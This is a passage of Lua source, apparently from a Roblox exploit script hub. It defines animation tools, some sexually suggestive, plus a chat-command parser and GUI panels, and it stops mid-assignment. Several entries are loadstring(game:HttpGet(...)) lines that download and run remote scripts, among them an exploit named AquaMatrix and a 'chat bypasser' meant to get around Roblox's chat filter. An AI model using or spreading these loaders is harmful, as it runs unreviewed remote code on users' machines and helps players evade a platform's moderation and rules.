local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local TOOL_NAME = "shocked"
local ANIMATION_ID = "rbxassetid://94861246"

local function giveTool()
	if LocalPlayer:FindFirstChildOfClass("Backpack"):FindFirstChild(TOOL_NAME) then return end

	local tool = Instance.new("Tool")
	tool.Name = TOOL_NAME
	tool.RequiresHandle = false
	tool.CanBeDropped = false
	tool.Parent = LocalPlayer:WaitForChild("Backpack")

	return tool
end

local function setupTool(tool)
	local animTrack = nil
	local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
	local humanoid = character:WaitForChild("Humanoid")
	local animator = humanoid:FindFirstChildOfClass("Animator") or Instance.new("Animator", humanoid)

	local animation = Instance.new("Animation")
	animation.AnimationId = ANIMATION_ID

	tool.Equipped:Connect(function()
		if animTrack then animTrack:Stop() end
		animTrack = animator:LoadAnimation(animation)
		animTrack.Priority = Enum.AnimationPriority.Action
		animTrack:Play()
    animTrack.TimePosition = 1.3
    animTrack:AdjustSpeed(0)
	end)

	tool.Unequipped:Connect(function()
		if animTrack then
			animTrack:Stop()
			animTrack = nil
		end
	end)
end

local tool = giveTool()
setupTool(tool)
]], "CS / SS")

cscript("spin dance tool", [[
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local TOOL_NAME = "spin dance"
local ANIMATION_ID = "rbxassetid://429730430"

local function giveTool()
	if LocalPlayer:FindFirstChildOfClass("Backpack"):FindFirstChild(TOOL_NAME) then return end

	local tool = Instance.new("Tool")
	tool.Name = TOOL_NAME
	tool.RequiresHandle = false
	tool.CanBeDropped = false
	tool.Parent = LocalPlayer:WaitForChild("Backpack")

	return tool
end

local function setupTool(tool)
	local animTrack = nil
	local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
	local humanoid = character:WaitForChild("Humanoid")
	local animator = humanoid:FindFirstChildOfClass("Animator") or Instance.new("Animator", humanoid)

	local animation = Instance.new("Animation")
	animation.AnimationId = ANIMATION_ID

	tool.Equipped:Connect(function()
		if animTrack then animTrack:Stop() end
		animTrack = animator:LoadAnimation(animation)
		animTrack.Priority = Enum.AnimationPriority.Action
		animTrack:Play()
	end)

	tool.Unequipped:Connect(function()
		if animTrack then
			animTrack:Stop()
			animTrack = nil
		end
	end)
end

local tool = giveTool()
setupTool(tool)
]], "CS / SS")

cscript("look right tool", [[
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local TOOL_NAME = "look right"
local ANIMATION_ID = "rbxassetid://88016955"

local function giveTool()
	if LocalPlayer:FindFirstChildOfClass("Backpack"):FindFirstChild(TOOL_NAME) then return end

	local tool = Instance.new("Tool")
	tool.Name = TOOL_NAME
	tool.RequiresHandle = false
	tool.CanBeDropped = false
	tool.Parent = LocalPlayer:WaitForChild("Backpack")

	return tool
end

local function setupTool(tool)
	local animTrack = nil
	local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
	local humanoid = character:WaitForChild("Humanoid")
	local animator = humanoid:FindFirstChildOfClass("Animator") or Instance.new("Animator", humanoid)

	local animation = Instance.new("Animation")
	animation.AnimationId = ANIMATION_ID

	tool.Equipped:Connect(function()
		if animTrack then animTrack:Stop() end
		animTrack = animator:LoadAnimation(animation)
		animTrack.Priority = Enum.AnimationPriority.Action
		animTrack:Play()
	end)

	tool.Unequipped:Connect(function()
		if animTrack then
			animTrack:Stop()
			animTrack = nil
		end
	end)
end

local tool = giveTool()
setupTool(tool)
]], "CS / SS")

cscript("bow down tool", [[
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local TOOL_NAME = "bow down"
local ANIMATION_ID = "rbxassetid://204292303"

local function giveTool()
	if LocalPlayer:FindFirstChildOfClass("Backpack"):FindFirstChild(TOOL_NAME) then return end

	local tool = Instance.new("Tool")
	tool.Name = TOOL_NAME
	tool.RequiresHandle = false
	tool.CanBeDropped = false
	tool.Parent = LocalPlayer:WaitForChild("Backpack")

	return tool
end

local function setupTool(tool)
	local animTrack = nil
	local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
	local humanoid = character:WaitForChild("Humanoid")
	local animator = humanoid:FindFirstChildOfClass("Animator") or Instance.new("Animator", humanoid)

	local animation = Instance.new("Animation")
	animation.AnimationId = ANIMATION_ID

	tool.Equipped:Connect(function()
		if animTrack then animTrack:Stop() end
		animTrack = animator:LoadAnimation(animation)
		animTrack.Priority = Enum.AnimationPriority.Action
		animTrack:Play()
        task.wait(0.9)
        animTrack:AdjustSpeed(0)
	end)

	tool.Unequipped:Connect(function()
		if animTrack then
			animTrack:Stop()
			animTrack = nil
		end
	end)
end

local tool = giveTool()
setupTool(tool)
]], "CS / SS")

cscript("the thinker tool", [[
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local TOOL_NAME = "the thinker"
local ANIMATION_ID = "rbxassetid://120735709"
local ANIMATION_ID2 = "rbxassetid://120735762"
local ANIMATION_ID3 = "rbxassetid://287325678"

local function giveTool()
	if LocalPlayer:FindFirstChildOfClass("Backpack"):FindFirstChild(TOOL_NAME) then return end

	local tool = Instance.new("Tool")
	tool.Name = TOOL_NAME
	tool.RequiresHandle = false
	tool.CanBeDropped = false
	tool.Parent = LocalPlayer:WaitForChild("Backpack")

	return tool
end

local function setupTool(tool)
	local animTrack = nil
	local animTrack2 = nil
	local animTrack3 = nil
	local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
	local humanoid = character:WaitForChild("Humanoid")
	local animator = humanoid:FindFirstChildOfClass("Animator") or Instance.new("Animator", humanoid)

	local animation = Instance.new("Animation")
	animation.AnimationId = ANIMATION_ID
	
	local animation2 = Instance.new("Animation")
	animation2.AnimationId = ANIMATION_ID2
	
	local animation3 = Instance.new("Animation")
	animation3.AnimationId = ANIMATION_ID3

	tool.Equipped:Connect(function()
		if animTrack then animTrack:Stop() end
		if animTrack2 then animTrack2:Stop() end
		if animTrack3 then animTrack3:Stop() end
		animTrack = animator:LoadAnimation(animation)
		animTrack.Priority = Enum.AnimationPriority.Action
		animTrack:Play()
		animTrack2 = animator:LoadAnimation(animation2)
		animTrack2.Priority = Enum.AnimationPriority.Action
		animTrack2:Play()
		animTrack3 = animator:LoadAnimation(animation3)
		animTrack3.Priority = Enum.AnimationPriority.Action
		animTrack3:Play()
		animTrack3:AdjustWeight(999)
	end)

	tool.Unequipped:Connect(function()
		if animTrack then
			animTrack:Stop()
			animTrack = nil
		end
		if animTrack2 then
			animTrack2:Stop()
			animTrack2 = nil
		end
		if animTrack3 then
			animTrack3:Stop()
			animTrack3 = nil
		end
	end)
end

local tool = giveTool()
setupTool(tool)
]], "CS / SS")

cscript("imitate sucking tool", [[
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local TOOL_NAME = "imitate sucking"
local ANIMATION_ID = "rbxassetid://73177702"
local ANIMATION_ID2 = "rbxassetid://183696478"

local function giveTool()
	if LocalPlayer:FindFirstChildOfClass("Backpack"):FindFirstChild(TOOL_NAME) then return end

	local tool = Instance.new("Tool")
	tool.Name = TOOL_NAME
	tool.RequiresHandle = false
	tool.CanBeDropped = false
	tool.Parent = LocalPlayer:WaitForChild("Backpack")

	return tool
end

local function setupTool(tool)
	local animTrack = nil
	local animTrack2 = nil
	local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
	local humanoid = character:WaitForChild("Humanoid")
	local animator = humanoid:FindFirstChildOfClass("Animator") or Instance.new("Animator", humanoid)

	local animation = Instance.new("Animation")
	animation.AnimationId = ANIMATION_ID
	
	local animation2 = Instance.new("Animation")
	animation2.AnimationId = ANIMATION_ID2

	tool.Equipped:Connect(function()
		if animTrack then animTrack:Stop() end
		if animTrack2 then animTrack2:Stop() end
		animTrack = animator:LoadAnimation(animation)
		animTrack.Priority = Enum.AnimationPriority.Action
		animTrack:Play()
		animTrack:AdjustWeight(1)
		animTrack2 = animator:LoadAnimation(animation2)
		animTrack2.Priority = Enum.AnimationPriority.Action
		animTrack2:Play()
		animTrack2:AdjustWeight(1)
	end)

	tool.Unequipped:Connect(function()
		if animTrack then
			animTrack:Stop()
			animTrack = nil
		end
		if animTrack2 then
			animTrack2:Stop()
			animTrack2 = nil
		end
	end)
end

local tool = giveTool()
setupTool(tool)
]], "CS / SS")

cscript("kneel suck tool", [[
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local TOOL_NAME = "kneel suck"
local ANIMATION_ID = "rbxassetid://73177702"
local ANIMATION_ID2 = "rbxassetid://287325678"
local ANIMATION_ID3 = "rbxassetid://183696478"

local function giveTool()
	if LocalPlayer:FindFirstChildOfClass("Backpack"):FindFirstChild(TOOL_NAME) then return end

	local tool = Instance.new("Tool")
	tool.Name = TOOL_NAME
	tool.RequiresHandle = false
	tool.CanBeDropped = false
	tool.Parent = LocalPlayer:WaitForChild("Backpack")

	return tool
end

local function setupTool(tool)
	local animTrack1 = nil
	local animTrack2 = nil
	local animTrack3 = nil

	local function stopAll()
		if animTrack1 then animTrack1:Stop() animTrack1 = nil end
		if animTrack2 then animTrack2:Stop() animTrack2 = nil end
		if animTrack3 then animTrack3:Stop() animTrack3 = nil end
	end

	local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
	local humanoid = character:WaitForChild("Humanoid")
	local animator = humanoid:FindFirstChildOfClass("Animator") or Instance.new("Animator", humanoid)

	local animation1 = Instance.new("Animation")
	animation1.AnimationId = ANIMATION_ID

	local animation2 = Instance.new("Animation")
	animation2.AnimationId = ANIMATION_ID2
	
	local animation3 = Instance.new("Animation")
	animation3.AnimationId = ANIMATION_ID3

	tool.Equipped:Connect(function()
		stopAll()

		animTrack1 = animator:LoadAnimation(animation1)
		animTrack2 = animator:LoadAnimation(animation2)
		animTrack3 = animator:LoadAnimation(animation3)

		animTrack1.Priority = Enum.AnimationPriority.Action
		animTrack2.Priority = Enum.AnimationPriority.Action
		animTrack3.Priority = Enum.AnimationPriority.Action

		animTrack1:Play()
		animTrack2:Play()
		animTrack2:AdjustWeight(999)
		animTrack3:Play()
	end)

	tool.Unequipped:Connect(stopAll)
end

local tool = giveTool()
setupTool(tool)
]], "CS / SS")

cscript("aquamatrix", [[
loadstring(game:HttpGet("https://raw.githubusercontent.com/ExploitFin/AquaMatrix/refs/heads/AquaMatrix/AquaMatrix"))()
]], "LS")

cscript("gazer chat bypasser", [[
loadstring(game:HttpGet("https://raw.githubusercontent.com/Boxten-Keyes/music/refs/heads/main/music%23%5Bscripts%5D/music%23%5Bchat%20bypasser%5D.lua"))()
]], "LS")

cscript("chat reverser", [[
loadstring(game:HttpGet("https://raw.githubusercontent.com/Boxten-Keyes/music/refs/heads/main/music%23%5Bscripts%5D/music%23%5Bchat%20reverser%5D.lua"))()
]], "LS")

cscript("chat owoifier", [[
loadstring(game:HttpGet("https://raw.githubusercontent.com/Boxten-Keyes/music/refs/heads/main/music%23%5Bscripts%5D/music%23%5Bchat%20owoifier%5D.lua"))()
]], "LS")

cscript("player camlock", [[
loadstring(game:HttpGet("https://raw.githubusercontent.com/Boxten-Keyes/music/refs/heads/main/music%23%5Bchatgpt%20scripts%5D/music%23%5Bplayer%20camlock%5D.lua"))()
]], "LS")

cscript("r15 fly tools", [[
loadstring(game:HttpGet("https://raw.githubusercontent.com/Boxten-Keyes/music/refs/heads/main/music%23%5Bchatgpt%20scripts%5D/music%23%5Br15%20fly%5D.lua"))()
]], "LS")

cscript("r6 dances", [[
loadstring(game:HttpGet("https://raw.githubusercontent.com/Boxten-Keyes/music/refs/heads/main/music%23%5Bscripts%5D/music%23%5Bepik%20r6%20dances%5D/music%23%5Bloader%5D.lua"))()
]], "LS")

-------------------------------------------------------------------------------------------------------------------------------

box["commands tab"].Size = UDim2.new(0, 100, 0, 26)
box["commands tab"].Position = UDim2.new(0, 100, 0, 1)

box["commands tab"].BackgroundColor3 = box["default background color"]

box["commands tab"].BorderColor3 = box["default border color"]
box["commands tab"].BorderSizePixel = 1

box["commands tab"].TextColor3 = box["default border color"]
box["commands tab"].Font = Enum.Font.RobotoMono
box["commands tab"].TextSize = 15
box["commands tab"].TextScaled = false
box["commands tab"].Text = "commands"
box["commands tab"].TextXAlignment = Enum.TextXAlignment.Center
box["commands tab"].TextYAlignment = Enum.TextYAlignment.Center

box["commands tab text padding"] = Instance.new("UIPadding")
box["commands tab text padding"].PaddingLeft = UDim.new(0, 0)
box["commands tab text padding"].Parent = box["commands tab"]

box["commands tab"].Parent = box["main frame 1"]
box["commands tab"].ZIndex = 19

box["commands tab bottom cover"].Size = UDim2.new(0, 100, 0, 2)
box["commands tab bottom cover"].Position = UDim2.new(0, 100, 0, 27)
box["commands tab bottom cover"].BackgroundColor3 = box["default background color"]
box["commands tab bottom cover"].BorderSizePixel = 0
box["commands tab bottom cover"].Parent = box["main frame 1"]
box["commands tab bottom cover"].ZIndex = 19.5
box["commands tab bottom cover"].Visible = false

-------------------------------------------------------------------------------------------------------------------------------

box["list of commands"].Size = UDim2.new(0, 393, 0, 164)
box["list of commands"].Position = UDim2.new(0, 4, 0, 32)
box["list of commands"].BackgroundColor3 = box["default background color"]
box["list of commands"].BorderColor3 = box["default border color"]
box["list of commands"].BorderSizePixel = 1
box["list of commands"].ScrollBarThickness = 8
box["list of commands"].ScrollBarImageColor3 = box["default 1/2 color"]
box["list of commands"].CanvasSize = UDim2.new(0, 0, 0, 0)
box["list of commands"].Parent = box["main frame 1"]
box["list of commands"].ZIndex = 19
box["list of commands"].Visible = false
box["list of commands"].ScrollingDirection = Enum.ScrollingDirection.Y

local listPadding = Instance.new("UIPadding")
listPadding.PaddingLeft = UDim.new(0, 4)
listPadding.PaddingTop = UDim.new(0, 4)
listPadding.Parent = box["list of commands"]

local layout = Instance.new("UIListLayout")
layout.SortOrder = Enum.SortOrder.LayoutOrder
layout.Padding = UDim.new(0, 0)
layout.Parent = box["list of commands"]

layout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
	box["list of commands"].CanvasSize = UDim2.new(0, 0, 0, layout.AbsoluteContentSize.Y + 10)
end)

function populateList(scrollFrame, entries)
	for _, text in ipairs(entries) do
		local line = Instance.new("TextLabel")
		line.Size = UDim2.new(1, -10, 0, 16)
		line.TextColor3 = box["default border color"]
		line.BackgroundTransparency = 1
		line.Font = Enum.Font.RobotoMono
		line.TextSize = 15
		line.TextScaled = false
		line.Text = text
		line.TextWrapped = false
		line.TextXAlignment = Enum.TextXAlignment.Left
		line.ZIndex = 20
		line.Parent = scrollFrame
	end
end

-------------------------------------------------------------------------------------------------------------------------------

local commands = {}
local prefix = "."
local prefixreq = true
local lastCommandTime = 0
local commandCooldown = 0.2

local txtchatsvc = game:GetService("TextChatService").ChatVersion == Enum.ChatVersion.TextChatService

function addcommand(name, shortname, func)
	commands[string.lower(name)] = func
	if shortname and shortname ~= "" then
		commands[string.lower(shortname)] = func
	end
end

function changeprefix(newprefix)
	if newprefix and newprefix ~= "" then
		prefix = newprefix
		box["command prefix"].Text = "command prefix: " .. newprefix
	end
end

local function parsecmds(input)
	local cmdgroups = {}
	local currentcmd = {}

	local words = {}
	for word in string.gmatch(input, "[^%s]+") do
		table.insert(words, word)
	end

	for i, word in ipairs(words) do
		if word:sub(1, #prefix) == prefix then
			if #currentcmd > 0 then
				table.insert(cmdgroups, currentcmd)
			end
			currentcmd = {word:sub(#prefix + 1)}
		elseif #currentcmd == 0 then
			currentcmd = {word}
		else
			table.insert(currentcmd, word)
		end
	end

	if #currentcmd > 0 then
		table.insert(cmdgroups, currentcmd)
	end

	return cmdgroups
end

local function execcmd(input)
	local now = tick()
	if now - lastCommandTime < commandCooldown then
		return false
	end

	local cmdgroups = parsecmds(input)

	if prefixreq and #cmdgroups > 1 then
		for _, cmd in ipairs(cmdgroups) do
			local cmdname = string.lower(cmd[1])
			if not commands[cmdname] then
				return false
			end
		end
	end

	local executed = false
	for _, cmd in ipairs(cmdgroups) do
		local cmdname = string.lower(table.remove(cmd, 1))
		if commands[cmdname] then
			commands[cmdname](table.unpack(cmd))
			executed = true
		end
	end

	if executed then
		lastCommandTime = now
	end

	return executed
end

local function onmsg(message, speaker)
	if speaker == game:GetService("Players").LocalPlayer then
		if message:sub(1, #prefix) == prefix then
			execcmd(message)
		end
	end
end

if txtchatsvc then
	game:GetService("TextChatService").OnIncomingMessage = function(message)
		if message.TextSource then
			local speaker = game:GetService("Players"):GetPlayerByUserId(message.TextSource.UserId)
			if box["unlocked"] == true then
				onmsg(message.Text, speaker)
			end
		end
	end
else
	game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.OnMessageDoneFiltering.OnClientEvent:Connect(function(messageData)
		if messageData.FromSpeaker == game:GetService("Players").LocalPlayer.Name then
			if box["unlocked"] == true then
				onmsg(messageData.Message, game:GetService("Players").LocalPlayer)
			end
		end
	end)
end

box["command bar"].Size = UDim2.new(0, 343, 0, 45)
box["command bar"].Position = UDim2.new(0, 4, 0, 201)

box["command bar"].BackgroundColor3 = box["default background color"]
box["command bar"].BorderColor3 = box["default border color"]
box["command bar"].BorderSizePixel = 1
box["command bar"].ClipsDescendants = true

box["command bar"].TextColor3 = box["default border color"]
box["command bar"].Font = Enum.Font.RobotoMono
box["command bar"].TextSize = 15
box["command bar"].TextScaled = false
box["command bar"].PlaceholderText = "type command here"
box["command bar"].PlaceholderColor3 = box["default 1/2 color"]
box["command bar"].ClearTextOnFocus = true
box["command bar"].Text = ""
box["command bar"].TextXAlignment = Enum.TextXAlignment.Center
box["command bar"].TextYAlignment = Enum.TextYAlignment.Center

box["command bar text padding"] = Instance.new("UIPadding")
box["command bar text padding"].PaddingLeft = UDim.new(0, 0)
box["command bar text padding"].Parent = box["command bar"]

box["command bar"].Parent = box["main frame 1"]
box["command bar"].ZIndex = 19
box["command bar"].Visible = false

-------------------------------------------------------------------------------------------------------------------------------

box["execute command button"].Size = UDim2.new(0, 45, 0, 45)
box["execute command button"].Position = UDim2.new(0, 352, 0, 201)

box["execute command button"].BackgroundColor3 = box["default background color"]

box["execute command button"].BorderColor3 = box["default border color"]
box["execute command button"].BorderSizePixel = 1

box["execute command button"].TextColor3 = box["default border color"]
box["execute command button"].Font = Enum.Font.RobotoMono
box["execute command button"].TextSize = 15
box["execute command button"].TextScaled = false
box["execute command button"].Visible = false
box["execute command button"].Text = ">_"
box["execute command button"].TextXAlignment = Enum.TextXAlignment.Center
box["execute command button"].TextYAlignment = Enum.TextYAlignment.Center

box["execute command button text padding"] = Instance.new("UIPadding")
box["execute command button text padding"].PaddingLeft = UDim.new(0, 0)
box["execute command button text padding"].Parent = box["execute command button"]

box["execute command button"].Parent = box["main frame 1"]
box["execute command button"].ZIndex = 19

local function handle(command, clr)
	if command == "" then
		return
	end

	if clr then
		box["command bar"].Text = ""
	end

	if not execcmd(command) then
		local words = {}
		for word in string.gmatch(command, "[^%s]+") do
			table.insert(words, word)
		end

		if #words > 0 then
			words[1] = prefix .. words[1]
			execcmd(table.concat(words, " "))
		end
	end
end

box["execute command button"].MouseButton1Click:Connect(function()
	box["click sound"]:Play()
	local command = box["command bar"].Text
	handle(command, false)
end)

box["command bar"].FocusLost:Connect(function(enterPressed)
	if enterPressed then
		local command = box["command bar"].Text
		handle(command, true)
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

box["asset ids tab"].Size = UDim2.new(0, 100, 0, 26)
box["asset ids tab"].Position = UDim2.new(0, 200, 0, 1)

box["asset ids tab"].BackgroundColor3 = box["default background color"]

box["asset ids tab"].BorderColor3 = box["default border color"]
box["asset ids tab"].BorderSizePixel = 1

box["asset ids tab"].TextColor3 = box["default border color"]
box["asset ids tab"].Font = Enum.Font.RobotoMono
box["asset ids tab"].TextSize = 15
box["asset ids tab"].TextScaled = false
box["asset ids tab"].Text = "asset IDs"
box["asset ids tab"].TextXAlignment = Enum.TextXAlignment.Center
box["asset ids tab"].TextYAlignment = Enum.TextYAlignment.Center

box["asset ids tab text padding"] = Instance.new("UIPadding")
box["asset ids tab text padding"].PaddingLeft = UDim.new(0, 0)
box["asset ids tab text padding"].Parent = box["asset ids tab"]

box["asset ids tab"].Parent = box["main frame 1"]
box["asset ids tab"].ZIndex = 19

box["asset ids tab bottom cover"].Size = UDim2.new(0, 100, 0, 2)
box["asset ids tab bottom cover"].Position = UDim2.new(0, 200, 0, 27)
box["asset ids tab bottom cover"].BackgroundColor3 = box["default background color"]
box["asset ids tab bottom cover"].BorderSizePixel = 0
box["asset ids tab bottom cover"].Parent = box["main frame 1"]
box["asset ids tab bottom cover"].ZIndex = 19.5
box["asset ids tab bottom cover"].Visible = false

-------------------------------------------------------------------------------------------------------------------------------

box["asset id type indicator"].Size = UDim2.new(0, 170, 0, 19)
box["asset id type indicator"].Position = UDim2.new(0, 28, 0, 32)
box["asset id type indicator"].BackgroundColor3 = box["default background color"]
box["asset id type indicator"].BorderColor3 = box["default border color"]
box["asset id type indicator"].BorderSizePixel = 1
box["asset id type indicator"].TextColor3 = box["default border color"]
box["asset id type indicator"].Font = Enum.Font.RobotoMono
box["asset id type indicator"].TextSize = 15
box["asset id type indicator"].TextScaled = false
box["asset id type indicator"].Text = ""
box["asset id type indicator"].TextXAlignment = Enum.TextXAlignment.Center
box["asset id type indicator"].TextYAlignment = Enum.TextYAlignment.Center
box["asset id type indicator text padding"] = Instance.new("UIPadding")
box["asset id type indicator text padding"].PaddingBottom = UDim.new(0, 1)
box["asset id type indicator text padding"].Parent = box["asset id type indicator"]
box["asset id type indicator"].Parent = box["main frame 1"]
box["asset id type indicator"].ZIndex = 19
box["asset id type indicator"].Visible = false

-------------------------------------------------------------------------------------------------------------------------------

box["asset id search bar"].Size = UDim2.new(0, 170, 0, 19)
box["asset id search bar"].Position = UDim2.new(0, 203, 0, 32)
box["asset id search bar"].BackgroundColor3 = box["default background color"]
box["asset id search bar"].BorderColor3 = box["default border color"]
box["asset id search bar"].BorderSizePixel = 1
box["asset id search bar"].TextColor3 = box["default border color"]
box["asset id search bar"].Font = Enum.Font.RobotoMono
box["asset id search bar"].TextSize = 15
box["asset id search bar"].TextScaled = false
box["asset id search bar"].Text = ""
box["asset id search bar"].PlaceholderColor3 = box["default 1/2 color"]
box["asset id search bar"].PlaceholderText = "search assets"
box["asset id search bar"].TextXAlignment = Enum.TextXAlignment.Center
box["asset id search bar"].TextYAlignment = Enum.TextYAlignment.Center
box["asset id search bar text padding"] = Instance.new("UIPadding")
box["asset id search bar text padding"].PaddingBottom = UDim.new(0, 1)
box["asset id search bar text padding"].Parent = box["asset id search bar"]
box["asset id search bar"].Parent = box["main frame 1"]
box["asset id search bar"].ZIndex = 19
box["asset id search bar"].Visible = false

-------------------------------------------------------------------------------------------------------------------------------

box["switch asset id type button"].Size = UDim2.new(0, 19, 0, 19)
box["switch asset id type button"].Position = UDim2.new(0, 4, 0, 32)
box["switch asset id type button"].BackgroundColor3 = box["default background color"]
box["switch asset id type button"].BorderColor3 = box["default border color"]
box["switch asset id type button"].BorderSizePixel = 1
box["switch asset id type button"].TextColor3 = box["default border color"]
box["switch asset id type button"].Font = Enum.Font.RobotoMono
box["switch asset id type button"].TextSize = 15
box["switch asset id type button"].TextScaled = false
box["switch asset id type button"].Text = "<"
box["switch asset id type button"].TextXAlignment = Enum.TextXAlignment.Center
box["switch asset id type button"].TextYAlignment = Enum.TextYAlignment.Center
box["switch asset id type button"].Parent = box["main frame 1"]
box["switch asset id type button"].ZIndex = 20
box["switch asset id type button"].Visible = false
box["switch asset id type button text padding"] = Instance.new("UIPadding")
box["switch asset id type button text padding"].PaddingTop = UDim.new(0, -2)
box["switch asset id type button text padding"].Parent = box["switch asset id type button"]

box["switch asset id type button 2"].Size = UDim2.new(0, 19, 0, 19)
box["switch asset id type button 2"].Position = UDim2.new(0, 378, 0, 32)
box["switch asset id type button 2"].BackgroundColor3 = box["default background color"]
box["switch asset id type button 2"].BorderColor3 = box["default border color"]
box["switch asset id type button 2"].BorderSizePixel = 1
box["switch asset id type button 2"].TextColor3 = box["default border color"]
box["switch asset id type button 2"].Font = Enum.Font.RobotoMono
box["switch asset id type button 2"].TextSize = 15
box["switch asset id type button 2"].TextScaled = false
box["switch asset id type button 2"].Text = ">"
box["switch asset id type button 2"].TextXAlignment = Enum.TextXAlignment.Center
box["switch asset id type button 2"].TextYAlignment = Enum.TextYAlignment.Center
box["switch asset id type button 2"].Parent = box["main frame 1"]
box["switch asset id type button 2"].ZIndex = 20
box["switch asset id type button 2"].Visible = false
box["switch asset id type button 2 text padding"] = Instance.new("UIPadding")
box["switch asset id type button 2 text padding"].PaddingTop = UDim.new(0, -2)
box["switch asset id type button 2 text padding"].Parent = box["switch asset id type button 2"]

-------------------------------------------------------------------------------------------------------------------------------

box["asset image 1"].Size = UDim2.new(0, 60, 0, 60)
box["asset image 1"].Position = UDim2.new(0, 28, 0, 56)
box["asset image 1"].Image = "rbxassetid://0"
box["asset image 1"].BackgroundColor3 = box["default background color"]
box["asset image 1"].BorderColor3 = box["default border color"]
box["asset image 1"].BorderSizePixel = 1
box["asset image 1"].Parent = box["main frame 1"]
box["asset image 1"].ZIndex = 19
box["asset image 1"].Visible = false

box["asset image name 1"].Size = UDim2.new(0, 280, 0, 27)
box["asset image name 1"].Position = UDim2.new(0, 93, 0, 56)
box["asset image name 1"].BackgroundColor3 = box["default background color"]
box["asset image name 1"].BorderColor3 = box["default border color"]
box["asset image name 1"].BorderSizePixel = 1
box["asset image name 1"].TextColor3 = box["default border color"]
box["asset image name 1"].Font = Enum.Font.RobotoMono
box["asset image name 1"].TextSize = 15
box["asset image name 1"].TextScaled = false
box["asset image name 1"].Text = "empty"
box["asset image name 1"].TextXAlignment = Enum.TextXAlignment.Center
box["asset image name 1"].TextYAlignment = Enum.TextYAlignment.Center
box["asset image name 1"].Parent = box["main frame 1"]
box["asset image name 1"].ZIndex = 19
box["asset image name 1"].Visible = false
box["asset image name 1 text padding"] = Instance.new("UIPadding")
box["asset image name 1 text padding"].PaddingTop = UDim.new(0, -2)
box["asset image name 1 text padding"].Parent = box["asset image name 1"]

box["asset image id 1"].Size = UDim2.new(0, 205, 0, 28)
box["asset image id 1"].Position = UDim2.new(0, 93, 0, 88)
box["asset image id 1"].BackgroundColor3 = box["default background color"]
box["asset image id 1"].BorderColor3 = box["default border color"]
box["asset image id 1"].BorderSizePixel = 1
box["asset image id 1"].TextColor3 = box["default border color"]
box["asset image id 1"].Font = Enum.Font.RobotoMono
box["asset image id 1"].TextSize = 15
box["asset image id 1"].TextScaled = false
box["asset image id 1"].Text = "id: empty"
box["asset image id 1"].TextXAlignment = Enum.TextXAlignment.Center
box["asset image id 1"].TextYAlignment = Enum.TextYAlignment.Center
box["asset image id 1"].Parent = box["main frame 1"]
box["asset image id 1"].ZIndex = 19
box["asset image id 1"].Visible = false
box["asset image id 1 text padding"] = Instance.new("UIPadding")
box["asset image id 1 text padding"].PaddingTop = UDim.new(0, -2)
box["asset image id 1 text padding"].Parent = box["asset image id 1"]

box["copy asset id 1 button"].Size = UDim2.new(0, 70, 0, 28)
box["copy asset id 1 button"].Position = UDim2.new(0, 303, 0, 88)
box["copy asset id 1 button"].BackgroundColor3 = box["default background color"]
box["copy asset id 1 button"].BorderColor3 = box["default border color"]
box["copy asset id 1 button"].BorderSizePixel = 1
box["copy asset id 1 button"].TextColor3 = box["default border color"]
box["copy asset id 1 button"].Font = Enum.Font.RobotoMono
box["copy asset id 1 button"].TextSize = 15
box["copy asset id 1 button"].TextScaled = false
box["copy asset id 1 button"].Text = "copy id"
box["copy asset id 1 button"].TextXAlignment = Enum.TextXAlignment.Center
box["copy asset id 1 button"].TextYAlignment = Enum.TextYAlignment.Center
box["copy asset id 1 button"].Parent = box["main frame 1"]
box["copy asset id 1 button"].ZIndex = 19
box["copy asset id 1 button"].Visible = false
box["copy asset id 1 button text padding"] = Instance.new("UIPadding")
box["copy asset id 1 button text padding"].PaddingTop = UDim.new(0, -2)
box["copy asset id 1 button text padding"].Parent = box["copy asset id 1 button"]

box["asset image 2"].Size = UDim2.new(0, 60, 0, 60)
box["asset image 2"].Position = UDim2.new(0, 28, 0, 121)
box["asset image 2"].Image = "rbxassetid://0"
box["asset image 2"].BackgroundColor3 = box["default background color"]
box["asset image 2"].BorderColor3 = box["default border color"]
box["asset image 2"].BorderSizePixel = 1
box["asset image 2"].Parent = box["main frame 1"]
box["asset image 2"].ZIndex = 19
box["asset image 2"].Visible = false

box["asset image name 2"].Size = UDim2.new(0, 280, 0, 27)
box["asset image name 2"].Position = UDim2.new(0, 93, 0, 121)
box["asset image name 2"].BackgroundColor3 = box["default background color"]
box["asset image name 2"].BorderColor3 = box["default border color"]
box["asset image name 2"].BorderSizePixel = 1
box["asset image name 2"].TextColor3 = box["default border color"]
box["asset image name 2"].Font = Enum.Font.RobotoMono
box["asset image name 2"].TextSize = 15
box["asset image name 2"].TextScaled = false
box["asset image name 2"].Text = "empty"
box["asset image name 2"].TextXAlignment = Enum.TextXAlignment.Center
box["asset image name 2"].TextYAlignment = Enum.TextYAlignment.Center
box["asset image name 2"].Parent = box["main frame 1"]
box["asset image name 2"].ZIndex = 19
box["asset image name 2"].Visible = false
box["asset image name 2 text padding"] = Instance.new("UIPadding")
box["asset image name 2 text padding"].PaddingTop = UDim.new(0, -2)
box["asset image name 2 text padding"].Parent = box["asset image name 2"]

box["asset image id 2"].Size = UDim2.new(0, 205, 0, 28)
box["asset image id 2"].Position = UDim2.new(0, 93, 0, 153)
box["asset image id 2"].BackgroundColor3 = box["default background color"]
box["asset image id 2"].BorderColor3 = box["default border color"]
box["asset image id 2"].BorderSizePixel = 1
box["asset image id 2"].TextColor3 = box["default border color"]
box["asset image id 2"].Font = Enum.Font.RobotoMono
box["asset image id 2"].TextSize = 15
box["asset image id 2"].TextScaled = false
